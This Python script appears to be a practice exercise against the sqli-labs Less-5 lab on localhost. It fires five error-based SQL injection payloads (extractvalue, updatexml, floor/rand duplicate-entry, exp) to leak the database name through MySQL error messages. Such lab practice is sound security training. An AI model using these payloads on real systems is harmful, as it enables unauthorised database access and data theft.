#!/usr/bin/env python3
import requests
from urllib.parse import quote
import re

# Test Less-5 Double Query injection
base_url = "http://localhost/sqli-labs/Less-5/"

print("=== Testing Less-5 Double Query Injection ===\n")

# Test basic single quote injection
print("1. Test single quote injection point:")
r = requests.get(f"{base_url}?id=1'")
if "You are in" in r.text:
    print("❌ Injection failed - normal content still displayed")
else:
    print("✅ Injection point exists - page content changed")
    # Print full response for debugging
    print(f"Response length: {len(r.text)} bytes")
    # Look for error messages
    error_match = re.search(r'error.*?:\s*(.+?)<', r.text, re.IGNORECASE | re.DOTALL)
    if error_match:
        print(f"Error message: {error_match.group(1)}")

print("\n2. Test extractvalue() error-based injection:")
payload = "1' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
if "XPATH" in r.text:
    print("✅ extractvalue() succeeded!")
    xpath_match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<]+)', r.text)
    if xpath_match:
        print(f"   Extracted data: {xpath_match.group(1)}")
else:
    print("❌ extractvalue() did not trigger XPATH error")
    # Print partial response content
    print(f"   Response snippet: {r.text[500:1000]}")

print("\n3. Test floor() + rand() error-based injection:")
payload = "1' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
if "Duplicate entry" in r.text or "error" in r.text.lower():
    print("✅ floor() + rand() may have succeeded!")
    # Extract data from Duplicate entry
    dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
    if dup_match:
        print(f"   Extracted data: {dup_match.group(1)}")
else:
    print("❌ floor() + rand() did not trigger an error")
    print(f"   Response length: {len(r.text)} bytes")

print("\n4. Test updatexml() error-based injection:")
payload = "1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
if "XPATH" in r.text:
    print("✅ updatexml() succeeded!")
    xpath_match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<]+)', r.text)
    if xpath_match:
        print(f"   Extracted data: {xpath_match.group(1)}")
else:
    print("❌ updatexml() did not trigger XPATH error")

print("\n5. Test exp() error-based injection:")
payload = "1' and exp(~(select * from(select database())a))--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
if "DOUBLE value is out of range" in r.text or "error" in r.text.lower():
    print("✅ exp() may have succeeded!")
    print(f"   Response contains error message")
else:
    print("❌ exp() did not trigger an error")

print("\n=== Test complete ===")
print("If all tests above failed, possible reasons:")
print("1. PHP configuration has error display disabled")
print("2. SQL syntax has issues")
print("3. A different closing method may be needed")
